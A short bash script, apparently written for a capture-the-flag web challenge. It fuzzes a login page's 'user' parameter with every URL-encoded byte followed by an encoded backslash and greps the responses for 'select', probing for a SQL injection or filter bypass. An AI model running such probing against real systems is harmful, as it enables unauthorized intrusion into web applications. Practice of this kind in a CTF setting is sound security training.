#!/usr/bin/env bash

# Author : Virink <virink@outlook.com>
# Date   : 2019/06/14, 00:24

dec2hex(){
    printf "%%%02x" $1
}

fuck(){
    printf "%%%02x" $1
    curl -k -s -q --cookie "PHPSESSID=ehu1kic5naiqvnmmflinslq4m3" \
    "http://f8965ae2516840e69ef9866d88b7c929a459890c60554558.changame.ichunqiu.com/result.php?user=admin$1%5c&pass=admin&pow=23efa4c" --output -
}

# fuck $(dec2hex 2) | grep select

for (( i = 0; i < 256; i++ )); do
    echo $i
    fuck $(dec2hex $i) | grep select
done
